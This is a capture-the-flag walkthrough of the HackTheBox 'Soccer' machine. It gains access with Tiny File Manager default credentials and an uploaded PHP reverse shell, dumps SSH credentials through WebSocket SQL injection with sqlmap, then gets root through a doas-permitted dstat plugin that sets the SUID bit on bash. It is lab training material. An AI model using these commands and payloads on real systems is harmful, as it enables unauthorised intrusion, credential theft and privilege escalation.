---
title: "HTB - Soccer (Easy | Linux | Web)"
date: 2026-09-22 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, linux, gobuster, tiny-file-manager, default-creds, php-reverse-shell, php, websocket, websocket-sqli, sqlmap, boolean-based-sqli, doas, dstat, suid-binaries]
description: "Default creds on Tiny File Manager to drop a PHP reverse shell, blind WebSocket SQL injection with sqlmap for SSH creds, then doas + a malicious dstat plugin to root via SUID bash"
image:
  path: /assets/img/soccer.png
---

## **Recon**

```bash
nmap -p- --min-rate 5000 -sSVC <target> -oN scan.txt
```

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 23 Sep 2026 17:10:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Connection: close
|     <pre>Cannot OPTIONS /</pre>
```

### Service Discovery Analysis

The Nmap scan reveals three key services running on the target machine:

- **SSH (Port 22):** OpenSSH 8.2p1 on Ubuntu 20.04
- **HTTP (Port 80):** nginx 1.18.0 — automatically redirects to `http://soccer.htb/`, confirming a virtual host setup
- **HTTP (Port 9091):** Unknown service responding to HTTP with 404/400 — the `Cannot GET /` error message pattern is characteristic of a Node.js Express application or WebSocket server

**OS:** Linux (Ubuntu 20.04) **Domain:** soccer.htb

The most interesting finding is **port 9091** — the HTTP responses suggest a Node.js application running on a non-standard port. The 404 on GET and 400 on other methods suggests this is not a regular web server but likely a WebSocket endpoint. This will become relevant after initial access. We add the domain to `/etc/hosts`:

```bash
echo "<target> soccer.htb" | sudo tee -a /etc/hosts
```

---

## **User**

### Directory Enumeration - HTTP (Port 80)

Accessing `http://soccer.htb/` reveals a soccer-themed website. We perform directory fuzzing with gobuster to discover hidden paths. The `-w` flag specifies the wordlist — `directory-list-2.3-medium.txt` is a comprehensive wordlist covering common directory names:

```bash
gobuster dir -u http://soccer.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```
tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

![](/assets/img/soccer/Pasted_image_20260923143047.png)

The `/tiny/` directory returns a 301 redirect — navigating to it reveals a web-based file manager.

### Overview - Tiny File Manager

**What is Tiny File Manager?** Tiny File Manager is a single-file PHP web application that provides a browser-based file manager. It allows users to upload, download, rename, delete, and manage files on the server through a web interface. It is commonly deployed by developers for easy file access but is extremely dangerous when exposed publicly.

**Why is it dangerous here?** Tiny File Manager ships with default credentials (`admin:admin@123`) that many administrators never change. More critically, if the web root or any web-accessible directory is writable, an attacker can upload arbitrary files — including PHP webshells — and achieve Remote Code Execution on the server.

### Tiny File Manager - Default Credential Access

![](/assets/img/soccer/Pasted_image_20260923142637.png)

The login panel accepts the default credentials found in the Tiny File Manager documentation:

- **Username:** `admin`
- **Password:** `admin@123`

![](/assets/img/soccer/Pasted_image_20260923143954.png)

Access is granted. The file manager exposes the full web directory structure.

### PHP Reverse Shell Upload

With file upload access to the web-accessible `/uploads/` directory, we upload a PHP reverse shell. We use the pre-installed reverse shell from Kali's webshells collection, editing it to include our attacker IP and listener port before uploading:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
# Edit the file: set $ip = '<attacker_ip>' and $port = 4444
```

We set up a Netcat listener to catch the incoming connection:

```bash
nc -lnvp 4444
```

We trigger execution by visiting the uploaded shell in the browser:

```bash
http://soccer.htb/tiny/uploads/php-reverse-shell.php
```

![](/assets/img/soccer/Pasted_image_20260923145742.png)

A reverse shell is received as `www-data`.

### System Enumeration - Discovering New Subdomain

Enumerating the system as `www-data`, we find a user called `player` in `/home/`:

![](/assets/img/soccer/Pasted_image_20260923145853.png)

Further enumeration of the nginx virtual host configuration reveals a second subdomain:

![](/assets/img/soccer/Pasted_image_20260923151220.png)

A new virtual host is configured: `soc-player.soccer.htb`. We add it to `/etc/hosts` and navigate to it:

![](/assets/img/soccer/Pasted_image_20260923151425.png)

The subdomain hosts a new web application with registration and login functionality. After registering an account and logging in, we examine the page source and notice a **WebSocket connection** being established to port 9091 — the unknown port we noticed during Nmap:

![](/assets/img/soccer/Pasted_image_20260923151840.png)

### Overview - WebSocket SQL Injection

**What is a WebSocket?** WebSocket is a communication protocol that provides full-duplex (bidirectional) communication channels over a single TCP connection. Unlike regular HTTP requests, WebSockets maintain a persistent connection between client and server, commonly used for real-time features like live chat, notifications, or in this case, ticket ID validation.

**Why is it injectable?** The application sends ticket IDs over the WebSocket as JSON (`{"id":"[value]"}`). The backend processes this input directly in a SQL query without sanitization. Since sqlmap supports WebSocket targets, we can automate the injection process by specifying the WebSocket URL and the JSON data format.

**What is Blind Boolean-Based SQL Injection?** With blind injection (`--technique=B`), the application doesn't return query results directly — instead, we infer data by asking true/false questions. sqlmap automates this by sending crafted payloads and analyzing response differences to extract data bit by bit.

### WebSocket SQL Injection via sqlmap

We use sqlmap against the WebSocket endpoint on port 9091. The `--data` flag specifies the JSON payload format with `*` marking the injection point. `--technique=B` restricts to boolean-based blind injection, `--dbms=mysql` specifies the backend database type, and `--dbs` enumerates all databases:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --technique=B --dbms=mysql --level=5 --risk=3 --batch --dbs
```

![](/assets/img/soccer/Pasted_image_20260923152931.png)

The `soccer_db` database is identified. We now enumerate its tables using `-D soccer_db --tables`:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --technique=B --dbms=mysql --level=5 --risk=3 --batch -D soccer_db --tables
```

![](/assets/img/soccer/Pasted_image_20260923155502.png)

An `accounts` table is found. We dump its contents using `-T accounts --dump`:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --technique=B --dbms=mysql --level=5 --risk=3 --batch -D soccer_db -T accounts --dump
```

![](/assets/img/soccer/Pasted_image_20260923160939.png)

**Credentials extracted:** `player:PlayerOftheMatch2022`

### SSH Access as player

We authenticate via SSH using the extracted credentials:

```bash
ssh player@soccer.htb
```

![](/assets/img/soccer/Pasted_image_20260923161031.png)

A shell is established as `player`. The user flag can now be retrieved.

---

## **Root**

### SUID Binary Enumeration

We search for SUID binaries — files with the SetUID bit set that run with the owner's privileges (typically root) regardless of who executes them. The `-perm -4000` flag matches files with SUID set, `-type f` restricts to files only, and `2>/dev/null` suppresses permission errors:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![](/assets/img/soccer/Pasted_image_20260923161510.png)

An unusual binary stands out: `/usr/local/bin/doas`. This is not a standard Linux binary — it's a privilege escalation tool.

### Overview - doas

**What is doas?** `doas` is a minimalist alternative to `sudo` originally developed for OpenBSD. It allows users to execute commands as another user (typically root) based on rules defined in `/etc/doas.conf`. Unlike `sudo`, doas is simpler and has a smaller attack surface, but misconfigurations in its rules file can be just as dangerous.

**Why is it interesting here?** doas is not installed by default on Ubuntu — its presence suggests a deliberate configuration. Checking `/etc/doas.conf` reveals what commands `player` is allowed to run:

![](/assets/img/soccer/Pasted_image_20260923161944.png)

The `doas.conf` rule allows `player` to run `/usr/bin/dstat` as root **without a password**. This is a critical misconfiguration.

### Overview - dstat Plugin System

**What is dstat?** dstat is a versatile Python-based system resource statistics tool. It displays real-time information about CPU, memory, disk, and network usage. What makes it dangerous in this context is its **plugin system** — dstat dynamically loads Python plugins at runtime from several directories, including `/usr/local/share/dstat/`.

**The exploit path:** If we can write to `/usr/local/share/dstat/`, we can create a malicious Python plugin that executes arbitrary code. When dstat is invoked with our plugin name via `doas` (as root), our Python code runs with root privileges.

### Verifying Write Permissions

We check the permissions on the dstat plugin directory:

![](/assets/img/soccer/Pasted_image_20260923162134.png)

The `player` group has write permissions on `/usr/local/share/dstat/`. Since `player` is a member of the `player` group, we can write files there.

### dstat Plugin Privilege Escalation

#### Step 1: Create Malicious dstat Plugin

dstat plugins must follow the naming convention `dstat_[module_name].py`. We create a plugin that sets the SUID bit on `/usr/bin/bash` — making bash run as root when executed with `-p`:

```bash
echo 'import os; os.system("chmod +s /usr/bin/bash")' > /usr/local/share/dstat/dstat_root.py
```

#### Step 2: Execute the Plugin as Root via doas

We invoke dstat through doas (which runs it as root) and load our malicious plugin using `--root` (matching the `dstat_root.py` filename suffix):

```bash
doas /usr/bin/dstat --root
```

dstat dynamically loads `dstat_root.py` and executes it as root — `chmod +s /usr/bin/bash` runs, setting the SUID bit on bash.

#### Step 3: Execute SUID Bash

We execute bash with the `-p` flag, which preserves the effective UID (root) instead of dropping privileges — giving us a root shell:

```bash
bash -p
```

![](/assets/img/soccer/Pasted_image_20260923162617.png)

Full root access is achieved. The root flag can now be retrieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified nginx on port 80 redirecting to `soccer.htb`, and an unknown Node.js service on port 9091 responding with HTTP 404
2. **Directory Fuzzing:** gobuster discovered `/tiny/` hosting a Tiny File Manager instance
3. **Default Credentials:** Logged into Tiny File Manager using default credentials `admin:admin@123`
4. **PHP Reverse Shell:** Uploaded a PHP reverse shell to the `/uploads/` directory and triggered it via browser to gain a `www-data` shell
5. **Subdomain Discovery:** Enumerated nginx virtual host configs from the shell and discovered `soc-player.soccer.htb`
6. **WebSocket Discovery:** Registered on the new subdomain and identified a WebSocket connection to port 9091 handling ticket ID validation
7. **WebSocket SQL Injection:** Used sqlmap against the WebSocket endpoint to perform boolean-based blind SQL injection, enumerating the `soccer_db` database and dumping the `accounts` table
8. **Credential Extraction:** Extracted `player:PlayerOftheMatch2022` from the database
9. **SSH Access:** Authenticated as `player` via SSH and retrieved user flag
10. **SUID Enumeration:** Found `doas` binary installed on the system; `doas.conf` allowed `player` to run `dstat` as root without password
11. **dstat Plugin Abuse:** Created malicious Python plugin `dstat_root.py` in the writable `/usr/local/share/dstat/` directory that sets SUID on `/usr/bin/bash`
12. **Root Access:** Executed malicious plugin via `doas /usr/bin/dstat --root`, then ran `bash -p` to obtain a root shell and retrieve root flag